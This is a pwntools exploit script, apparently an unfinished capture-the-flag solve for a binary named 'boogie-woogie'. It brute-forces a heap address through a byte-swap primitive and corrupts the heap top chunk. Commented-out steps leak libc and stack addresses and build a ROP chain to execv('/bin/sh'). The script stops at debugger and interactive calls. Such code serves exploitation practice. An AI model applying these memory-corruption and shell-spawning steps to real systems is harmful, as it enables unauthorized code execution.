from pwn import *
from tqdm.contrib.concurrent import process_map
from multiprocessing import Lock

libc = ELF("./src/libc.so.6")
context.arch = "amd64"
context.log_level = "error"

lock = Lock()


def exploit(p, heap):
    create_swap = lambda a, b: f"{a} {b}\n".encode()

    def send_msg(content, n=1):
        p.sendafter(b"exception:", content)
        for _ in range(n):
            p.recvuntil(b"\n\x1b[31;49;1;4m")
            msg = p.recvuntil(b"\x1b[0m", drop=True)
        return msg

    def readm(offset, sz):
        mem = [0]
        for i in range(sz):
            mem.append(
                chk[len(mem)]
                if len(chk := send_msg(create_swap(offset + i, len(mem)))) > len(mem)
                else 0
            )
            with open("mem", "wb") as f:
                f.write(bytes(mem))
        return bytes(mem[1:])

    print("heap: " + hex(heap))

    send_msg(create_swap("0" * 0x800, 1))

    stdin_buf = 0x6B0 + heap
    stdout_buf = 0x1200 + heap
    top_chunk_offset = 0x16B0 + heap

    # zero 2nd byte & shrink size of 1st byte
    print(
        repr(
            send_msg(
                flat(
                    b" ",
                    create_swap(top_chunk_offset + 8 + 2, top_chunk_offset + 8 + 2),
                    create_swap(stdin_buf + 0x80, top_chunk_offset + 8 + 1),
                    create_swap(stdin_buf + 0x80, stdin_buf),
                ).ljust(0x80, b" ")
                + b"\x09",
                n=3,
            )
        )
    )
    gdb.attach(p)

    # cause heap allocation & free top chunk
    p.interactive()

    print("doing alloc")
    send_msg(create_swap("0" * 0x800, 2))

    # get top chunk fd ptr (libc)
    # libc.address = send_msg(top_chunk_offset + 16) - 0x219CE0  # - 0x21ace0
    # print("libc: " + hex(libc.address))

    # # get data array from dso handle (exe)
    # data_arr = read_u64(-0x18) + 0x18
    # print("data_arr: " + hex(data_arr))

    # # stack to rop
    # stack = read_u64(libc.sym["environ"] - data_arr)
    # print("stack: " + hex(stack))

    # rop = ROP(libc)
    # rop.execv(next(libc.search(b"/bin/sh\x00")), 0)
    # rop = bytes(rop)

    # # append addresses at the end of the io buffer
    # ret_addr_offset = -data_arr + stack - 288

    # do_swap(
    #     flat(
    #         *(
    #             create_swap(stdin_buf + 0x800 + i, ret_addr_offset + i)
    #             for i in range(len(rop))
    #         ),
    #         create_swap(0, 0),
    #     ).ljust(0x800, b"\x00")
    #     + rop,
    #     n=len(rop),
    # )


def conn(_):
    lock.acquire()
    lock.release()

    # p = process("./src/boogie-woogie")
    p = process(
        'exec script -E never -q -c "./src/boogie-woogie" /dev/null', shell=True
    )
    # p = remote("mc.ax", 31040)
    # p = remote("localhost", 5000)

    # gdb.attach(p)

    try:

        def swap(a, b):
            p.sendlineafter(b"exception:", f"{a} {b}".encode())
            p.recvuntil(b"\n\x1b[31;49;1;4m")
            return p.recvuntil(b"\x1b[0m", drop=True)

        guess = 0x200000 - 0x20 + 0x8  # this can be guessed for bruteforce
        # offset = get_offset(p.pid)

        # once we get a non-zero byte @ start of heap, we'll get a length increase
        while len(swap(1, guess)) == 1:
            guess -= 0x1000
        heap = guess - 8
    except KeyboardInterrupt:
        exit()
    except:
        p.close()
        return
    with lock:
        exploit(p, heap)
    p.interactive()


if __name__ == "__main__":
    process_map(conn, range(0x200), max_workers=1)
    # conn(0)
